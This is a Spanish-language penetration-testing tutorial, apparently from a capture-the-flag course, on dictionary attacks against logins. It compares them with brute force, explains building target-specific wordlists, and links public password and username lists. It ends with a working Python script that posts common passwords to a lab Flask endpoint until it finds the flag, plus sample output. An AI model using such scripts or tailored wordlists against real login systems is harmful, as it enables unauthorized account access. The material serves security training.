
# Ataques de diccionario

Si bien es exhaustivo, el método de fuerza bruta puede requerir mucho tiempo y recursos, especialmente al trabajar con contraseñas complejas. Aquí es donde entran en juego los ataques de diccionario.

## <mark style="color:purple;">El poder de las palabras</mark>

La eficacia de un ataque de diccionario reside en su capacidad para explotar la tendencia humana a priorizar las contraseñas fáciles de recordar sobre las seguras. A pesar de las reiteradas advertencias, muchas personas siguen optando por contraseñas basadas en información fácilmente accesible, como palabras de diccionario, frases comunes, nombres o patrones fáciles de adivinar. Esta previsibilidad las hace vulnerables a los ataques de diccionario, en los que los atacantes prueban sistemáticamente una lista predefinida de posibles contraseñas en el sistema objetivo.

El éxito de un ataque de diccionario depende de la calidad y la especificidad de la lista de palabras utilizada. Una lista de palabras bien diseñada y adaptada al público o sistema objetivo puede aumentar significativamente la probabilidad de una vulneración exitosa. Por ejemplo, si el objetivo es un sistema frecuentado por jugadores, una lista de palabras enriquecida con terminología y jerga relacionada con los videojuegos resultaría más eficaz que un diccionario genérico. Cuanto más fielmente refleje la lista de palabras las probables contraseñas del objetivo, mayores serán las probabilidades de éxito del ataque.

En esencia, el concepto de ataque de diccionario se basa en la comprensión de la psicología humana y las prácticas comunes de contraseñas. Al aprovechar este conocimiento, los atacantes pueden descifrar eficazmente contraseñas que, de otro modo, requerirían un ataque de fuerza bruta de una duración impráctica. En este contexto, el poder de las palabras reside en su capacidad para explotar la previsibilidad humana y comprometer medidas de seguridad que, de otro modo, serían robustas.

## <mark style="color:purple;">Fuerza bruta vs. ataque de diccionario</mark>

La distinción fundamental entre un ataque de fuerza bruta y un ataque de diccionario radica en su metodología para generar posibles candidatos a contraseñas:

* `Brute Force`: Un ataque de fuerza bruta puro prueba sistemáticamente *todas las combinaciones posibles* de caracteres dentro de un conjunto y una longitud predeterminados. Si bien este enfoque garantiza el éxito con el tiempo suficiente, puede ser extremadamente lento, especialmente con contraseñas largas o complejas.
* `Dictionary Attack`: En marcado contraste, un ataque de diccionario emplea una lista precompilada de palabras y frases, lo que reduce drásticamente el espacio de búsqueda. Esta metodología específica resulta en un ataque mucho más eficiente y rápido, especialmente cuando se sospecha que la contraseña objetivo es una palabra o frase común.

<table data-header-hidden><thead><tr><th width="143.4296875"></th><th width="192.93359375"></th><th width="167.40234375"></th><th></th></tr></thead><tbody><tr><td>Característica</td><td>Ataque de diccionario</td><td>Ataque de fuerza bruta</td><td>Explicación</td></tr><tr><td><code>Eficiencia</code></td><td>Considerablemente más rápido y más eficiente en el uso de recursos.</td><td>Puede demandar muchísimo tiempo y recursos.</td><td>Los ataques de diccionario aprovechan una lista predefinida, lo que reduce significativamente el espacio de búsqueda en comparación con la fuerza bruta.</td></tr><tr><td><code>Targeting</code></td><td>Altamente adaptable y puede adaptarse a objetivos o sistemas específicos.</td><td>Sin capacidad de orientación inherente.</td><td>Las listas de palabras pueden incorporar información relevante para el objetivo (por ejemplo, nombre de la empresa, nombres de los empleados), lo que aumenta la tasa de éxito.</td></tr><tr><td><code>Efectividad</code></td><td>Excepcionalmente eficaz contra contraseñas débiles o de uso común.</td><td>Eficaz contra todas las contraseñas si se dispone de tiempo y recursos suficientes.</td><td>Si la contraseña objetivo está en el diccionario, se descubrirá rápidamente. La fuerza bruta, aunque universal, puede resultar poco práctica para contraseñas complejas debido al gran volumen de combinaciones.</td></tr><tr><td><code>Limitaciones</code></td><td>Ineficaz contra contraseñas complejas generadas aleatoriamente.</td><td>A menudo no resulta práctico para contraseñas largas o muy complejas.</td><td>Es improbable que una contraseña verdaderamente aleatoria aparezca en ningún diccionario, lo que hace que este ataque sea inútil. La enorme cantidad de combinaciones posibles para contraseñas largas puede hacer inviables los ataques de fuerza bruta.</td></tr></tbody></table>

Imaginemos un escenario hipotético en el que un atacante ataca el portal de inicio de sesión de empleados de una empresa. El atacante podría crear una lista de palabras especializada que incluya lo siguiente:

* Contraseñas débiles de uso común (por ejemplo, "`password123`", "`qwerty`")
* El nombre de la empresa y sus variaciones
* Nombres de empleados o departamentos
* Jerga específica de la industria

Al implementar esta lista de palabras específica en un ataque de diccionario, el atacante aumenta significativamente sus probabilidades de descifrar con éxito las contraseñas de los empleados en comparación con un intento de fuerza bruta puramente aleatorio.

### Creación y utilización de listas de palabras

Las listas de palabras se pueden obtener de varias fuentes, entre ellas:

* `Fuentes Públicas`: Internet alberga una gran cantidad de listas de palabras de libre acceso, que incluyen colecciones de contraseñas de uso común, credenciales filtradas tras filtraciones de datos y otros datos potencialmente valiosos. Repositorios como [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords) ofrecen diversas listas de palabras adaptadas a diversos escenarios de ataque.
* `Custom Wordlists`: Los pentesters pueden crear sus listas de palabras aprovechando la información obtenida durante la fase de reconocimiento. Esta podría incluir detalles sobre los intereses, aficiones, información personal o cualquier otro dato del objetivo para la creación de contraseñas.
* `Wordlists especializadas`: Las listas de palabras se pueden refinar para centrarse en industrias, aplicaciones o incluso empresas específicas. Estas listas especializadas aumentan la probabilidad de éxito al centrarse en las contraseñas con mayor probabilidad de uso en un contexto específico.
* `Pre-existing Lists`Ciertas herramientas y frameworks vienen preconfigurados con listas de palabras de uso común. Por ejemplo, las distribuciones de pruebas de penetración como Kali Linux o Parrot suelen incluir listas de palabras como `rockyou.txt`, una enorme colección de contraseñas filtradas, fácilmente disponibles.

A continuación se muestra una tabla con algunas de las listas de palabras más útiles para el inicio de sesión por fuerza bruta:

<table data-header-hidden><thead><tr><th width="232.6171875"></th><th width="208.0390625"></th><th width="194.34765625"></th><th></th></tr></thead><tbody><tr><td>Lista de palabras</td><td>Descripción</td><td>Uso típico</td><td>Fuente</td></tr><tr><td><code>rockyou.txt</code></td><td>Una popular lista de palabras clave que contiene millones de contraseñas se filtró durante la violación de RockYou.</td><td>Se utiliza comúnmente para ataques de fuerza bruta sobre contraseñas.</td><td><a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">RockYou</a></td></tr><tr><td><code>top-usernames-shortlist.txt</code></td><td>Una lista concisa de los nombres de usuario más comunes.</td><td>Adecuado para intentos rápidos de fuerza bruta de nombre de usuario.</td><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt">SecLists</a></td></tr><tr><td><code>xato-net-10-million-usernames.txt</code></td><td>Una lista más extensa de 10 millones de nombres de usuarios.</td><td>Se utiliza para realizar un ataque de fuerza bruta exhaustivo al nombre de usuario.</td><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt">SecLists</a></td></tr><tr><td><code>2023-200_most_used_passwords.txt</code></td><td>Una lista de las 200 contraseñas más utilizadas a partir de 2023.</td><td>Eficaz para identificar contraseñas comúnmente reutilizadas.</td><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt">SecLists</a></td></tr><tr><td><code>Default-Credentials/default-passwords.txt</code></td><td>Una lista de nombres de usuario y contraseñas predeterminados que se utilizan comúnmente en enrutadores, software y otros dispositivos.</td><td>Ideal para probar credenciales predeterminadas.</td><td><a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.txt">SecLists</a></td></tr></tbody></table>

## Ataque de diccionario a endpoint

Para finalizar veremos un ejemplo de ataque de diccionario a una aplicación Flask con un endpoint `/dictionary`.

La aplicación de instancia crea una ruta (`/dictionary`) que gestiona las solicitudes POST y espera un parámetro \``password`\` en los datos del formulario de la solicitud. Al recibir una solicitud, compara la contraseña enviada con el valor esperado. Si coincide, responde con un objeto JSON que contiene un mensaje de éxito y la flag. De lo contrario, devuelve un mensaje de error con un código de estado 401 (No autorizado).

Copia y pega este script de Python `dictionary-solver.py` a continuación en tu equipo. Solo necesitas modificar las variables de IP y puerto para que coincidan con la información de tu sistema de destino.

```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

El script de Python orquesta el ataque de diccionario. Realiza los siguientes pasos:

1. `Descarga la wordlist`: En primer lugar, el script obtiene una lista de palabras de 500 contraseñas comúnmente utilizadas (y, por lo tanto, débiles) de SecLists usando la `requests`biblioteca.
2. `Itera y envía la contraseña`: A continuación, itera cada contraseña de la lista de palabras descargada. Para cada contraseña, envía una solicitud POST al endpoint  `/dictionary` de la aplicación Flask, incluyendo la contraseña en los datos del formulario de la solicitud.
3. `Analiza las respuestas`: El script verifica el código de estado de la respuesta después de cada solicitud. Si es 200 (OK), examina el contenido de la respuesta con más detalle. Si la respuesta contiene la clave "flag", significa que el inicio de sesión se realizó correctamente. El script imprime la contraseña descubierta y la flag capturada.
4. `Continua o termina`: Si la respuesta no es correcta, el script pasa a la siguiente contraseña de la lista de palabras. Este proceso continúa hasta encontrar la contraseña correcta o hasta agotar la lista de palabras.

```shell-session
afsh4ck@kali$ python3 dictionary-solver.py

...
Attempted password: turtle
Attempted password: tiffany
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```
